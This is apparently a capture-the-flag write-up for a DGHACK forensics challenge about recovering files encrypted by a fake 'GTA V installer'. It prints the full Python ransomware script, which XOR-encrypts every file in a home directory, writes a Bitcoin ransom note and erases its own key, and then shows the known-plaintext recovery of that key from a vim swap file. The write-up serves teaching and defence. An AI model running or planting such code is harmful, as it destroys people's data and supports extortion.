# PAS_UN_BON_NOM
```
J'étais là tranquillou sur mon PC, m'voyez ? Je télécharge des films et tout, m'voyez ?
Et alors il y a ce message étrange que je dois payer Dogecoin pour déchiffrer mes données.
Je ne l'ai pas fait... donc maintenant mes données sont chiffrées :(
Donc tiens, prends le disque dur, c'est pas comme si il était utile maintenant...
Sauf si c'était possible de retrouver la clé utilisée par ce méchant hacker, m'voyez ?
S'il te plaiiiit ? Tu serais adorable merci !
```

We get a 5.26GB ova file

Just import it in virtual box and you get a debian machine

Inside this machine there is a scrypt `GTA_V_installer.py` :

```python
#!/bin/python3

import os
import fileinput
import sys

main_folder = "./"

def encryptDecrypt(inpDataBytes):

    # Define XOR key
    keyLength = len(xorKey)
 
    # calculate length of input string
    length = len(inpDataBytes)
 
    # perform XOR operation of key
    # with every byte
    for i in range(length):
        inpDataBytes[i] = inpDataBytes[i] ^ ord(xorKey[i % keyLength])

    return inpDataBytes

if __name__ == '__main__':
    # list all the files in the main folder, and its subfolders
    #list_of_files = [main_folder + f for f in os.listdir(main_folder) if os.path.isfile(main_folder + f) and not f.startswith('.')]
    list_of_files = []
    for root, dirs, files in os.walk(main_folder):
        for file in files:
            if not '/.' in os.path.join(root, file):
                # get the file name
                list_of_files.append(os.path.join(root, file))
    print(list_of_files)
    print("\n")

    xorKey = input("Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: ")

    for file in list_of_files:
        if "GTA_V_installer.py" not in file:
            with open(file, 'rb') as f:
                data = bytearray(f.read())
                print("data : " + str(data) + "\n")
                encrypted_data = encryptDecrypt(data)
                print("encrypted : " + str(encrypted_data) + "\n")
            with open(file, 'wb') as f:
                f.write(encrypted_data)

    # Create a READ_TO_RETRIEVE_YOUR_DATA.txt file
    with open(main_folder + "READ_TO_RETRIEVE_YOUR_DATA.txt", 'w') as f:
        f.write("Your PC is now encrypted.\nThe only way you may retrieve your data is by sending 1000 Bitcoins to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
        f.write("Add a message to the Bitcoin transfer with your email address.\nThe code to decrypt your data will be sent automatically to this email.\n")
        f.write("Once you get this code, simply run \"python GTA_V_installer.py\" and input your code.\n")
        f.write("I'm very sorry for the inconvenience. I need to feed my family.\n")
        f.write("HODL.\n")

    # I replace the line where the key is defined, that way I can use the same script for decryption without leaving any trace of the key
    is_edited = False
    for line in fileinput.input("./GTA_V_installer.py", inplace=1):
        if "xorKey = " in line and not is_edited:
            line = "    xorKey = input(\"Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: \")\n"
            is_edited = True
        sys.stdout.write(line)%                    
```

And a note `READ_TO_RETRIEVE_YOUR_DATA.txt` :

```
Your PC is now encrypted.
The only way you may retrieve your data is by sending 1000 Bitcoins to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Add a message to the Bitcoin transfer with your email address.
The code to decrypt your data will be sent automatically to this email.
Once you get this code, simply run "python GTA_V_installer.py" and input your code.
I'm very sorry for the inconvenience. I need to feed my family.
HODL.
```

Looking at the script a simple repeated XOR is used.

Lets look a the encrypted files, everything in the home is encrypted except the script, the note and the hidden files :

```
.
├── Desktop
│   ├── computer.desktop
│   ├── network.desktop
│   ├── trash-can.desktop
│   └── user-home.desktop
├── Documents
│   ├── 2019_Q1_report.txt
│   ├── 2019_Q2_report.txt
│   ├── 2019_Q3_report.txt
│   ├── 2019_Q4_report.txt
│   ├── 2020_Q1_report.txt
│   ├── 2020_Q2_report.txt
│   ├── 2020_Q3_report.txt
│   ├── 2020_Q4_report.txt
│   ├── 2021_Q1_report.txt
│   ├── 2021_Q2_report.txt
│   ├── 2021_Q3_report.txt
│   ├── 2021_Q4_report.txt
│   └── 2022_Q1_report.txt
├── Downloads
│   ├── Adobe_Photoshop.torrent
│   ├── Bloomberg_Terminal.torrent
│   ├── GTA_FIVE_C0MPL3T3_G4ME_CR4CK_SUP3R_L3GIT.torrent
│   ├── Star_Wars_VF.torrent
│   └── Trackmania_Cracked_Game.torrent
├── GTA_V_installer.py
├── Music
├── Pictures
├── Public
├── READ_TO_RETRIEVE_YOUR_DATA.txt
├── Templates
└── Videos

11 directories, 21 files
```

The key was written in the script but was removed after encryption
We could retrieve the original script with the `GTA_FIVE_C0MPL3T3_G4ME_CR4CK_SUP3R_L3GIT.torrent` but the torrent is encrypted as well.

Looking at `Documents/` there is a lot of txt files that could be use to do a frequency analysis to retrieve the key.

but there is better :

```
$ ls -l Documents/
drwxr-xr-x  2 jeanne jeanne  4096 nov.  12 18:47 .
drwxr-x--- 14 jeanne jeanne  4096 nov.  12 19:00 ..
-rw-rw-r--  1 jeanne jeanne  1116 oct.  14 12:31 2019_Q1_report.txt
-rw-rw-r--  1 jeanne jeanne   994 oct.  14 12:31 2019_Q2_report.txt
-rw-rw-r--  1 jeanne jeanne  1011 oct.  14 12:31 2019_Q3_report.txt
-rw-rw-r--  1 jeanne jeanne  1260 oct.  14 12:31 2019_Q4_report.txt
-rw-rw-r--  1 jeanne jeanne  1343 oct.  14 12:31 2020_Q1_report.txt
-rw-rw-r--  1 jeanne jeanne  1264 oct.  14 12:31 2020_Q2_report.txt
-rw-rw-r--  1 jeanne jeanne  1265 oct.  14 12:31 2020_Q3_report.txt
-rw-rw-r--  1 jeanne jeanne  1347 oct.  14 12:31 2020_Q4_report.txt
-rw-rw-r--  1 jeanne jeanne  1468 oct.  14 12:31 2021_Q1_report.txt
-rw-r--r--  1 jeanne jeanne 12288 oct.  14 12:29 .2021_Q1_report.txt.swp
-rw-rw-r--  1 jeanne jeanne  1289 oct.  14 12:31 2021_Q2_report.txt
-rw-rw-r--  1 jeanne jeanne  1407 oct.  14 12:31 2021_Q3_report.txt
-rw-rw-r--  1 jeanne jeanne  1447 oct.  14 12:31 2021_Q4_report.txt
-rw-rw-r--  1 jeanne jeanne  1434 oct.  14 12:31 2022_Q1_report.txt
```

There is a hidden file `.2021_Q1_report.txt.swp` from vim that hasnt be encrypted.

This is a vim swap file (the file must have been opened with vim at the moment of the encrytpion).

Open `2021_Q1_report.txt` with vim :

```
E325: ATTENTION
Found a swap file by the name ".2021_Q1_report.txt.swp"
          owned by: jeanne   dated: ven. oct. 14 12:29:59 2022
         file name: ~jeanne/Documents/2021_Q1_report.txt
          modified: YES
         user name: jeanne   host name: PC-jeanne
        process ID: 2514
While opening file "2021_Q1_report.txt"
             dated: ven. oct. 14 12:31:08 2022
      NEWER than swap file!

(1) Another program may be editing the same file.  If this is the case,
    be careful not to end up with two different instances of the same
    file when making changes.  Quit, or continue with caution.
(2) An edit session for this file crashed.
    If this is the case, use ":recover" or "vim -r 2021_Q1_report.txt"
    to recover the changes (see ":help recovery").
    If you did this already, delete the swap file ".2021_Q1_report.txt.swp"
    to avoid this message.

Swap file ".2021_Q1_report.txt.swp" already exists!
[O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort: 
```

Type `R` to recover and save the recovered file as `2021_Q1_report.clear`

Now we have the cyphered and clear text, we just have to xor these two files to get the key

```
[to be reused for Q3 2023]
In Q1, we achieved our highest ever vehicle production and deliveries. This was in spite of multiple challenges, including seasonality, supply chain instability and the transition to the new Model S and Model X. Our GAAP net income reached $438M, and our non-GAAP net income surpassed $1B for the first time in our history. While the ASP2 of our vehicles declined in Q1, our auto gross margin increased sequentially, as our costs decreased even faster. Reducing the average cost of the vehicles we produce is essential to our mission. In 2017, as we began production of Model 3, our average cost per vehicle across the fleet was ~$84,000. Due to the launch of new products and new factories and the reduced mix of Model S and Model X, our average cost declined to sub-$38,000 per vehicle in Q1. About three and a half years into its production, and even without a European factory, Model 3 was the best-selling premium sedan in the world,3 outselling long-time industry leaders such as the 3 Series and E-Class. This demonstrates that an electric vehicle can be a category leader and outsell its gas-powered counterparts. We believe Model Y can become not just a category leader, but also the best-selling vehicle of any kind globally. First deliveries of the new Model S should start very shortly, Model Y production rate in Shanghai continues to improve quickly and two new factories Berlin and Texas are making progress. There is a lot to be excited about in 2021.
```

Just keep in mind that there probably is diffs between this file and the cyphered one.

Lets reuse the original script to xor the two files :

```py
#!/bin/python3

import os
import fileinput
import sys

main_folder = "./"

def encryptDecrypt(inpDataBytes):

    # Define XOR key
    keyLength = len(xorKey)

    # calculate length of input string
    length = len(inpDataBytes)

    # perform XOR operation of key
    # with every byte
    for i in range(length):
        inpDataBytes[i] = inpDataBytes[i] ^ ord(xorKey[i % keyLength])

    return inpDataBytes

if __name__ == '__main__':
    xorKey = input("Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: ")
    with open('Documents/2021_Q1_report.txt','rb') as f:
        data = bytearray(f.read())

    print(encryptDecrypt(data))
```

Use the swp file as the key.

```
$ python3 GTA_V_installer.py
Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: 
In Q1, we achieved our highest ever vehicle production and deliveries. This was in spite of multiple challenges, including seasonality, supply chain instability and the transition to the new Model S and Model X. Our GAAP net income reached $438M, and our non-GAAP net income surpassed $1B for the first time in our history. While the ASP2 of our vehicles declined in Q1, our auto gross margin increased sequentially, as our costs decreased even faster. Reducing the average cost of the vehicles we produce is essential to our mission. In 2017, as we began production of Model 3, our average cost per vehicle across the fleet was ~$84,000. Due to the launch of new products and new factories and the reduced mix of Model S and Model X, our average cost declined to sub-$38,000 per vehicle in Q1. About three and a half years into its production, and even without a European factory, Model 3 was the best-selling premium sedan in the world,3 outselling long-time industry leaders such as the 3 Series and E-Class. This demonstrates that an electric vehicle can be a category leader and outsell its gas-powered counterparts. We believe Model Y can become not just a category leader, but also the best-selling vehicle of any kind globally. First deliveries of the new Model S should start very shortly, Model Y production rate in Shanghai continues to improve quickly and two new factories Berlin and Texas are making progress. There is a lot to be excited about in 2021.
```

And we get :

```
bytearray(b'REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl8p')
```

Paste this to a temps file and decode it with base64 :

```
$ base64 -d temp
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
DGHACK{7H15_1S_7H3_K3Y_G1V3N_)
```


flag : `DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}`

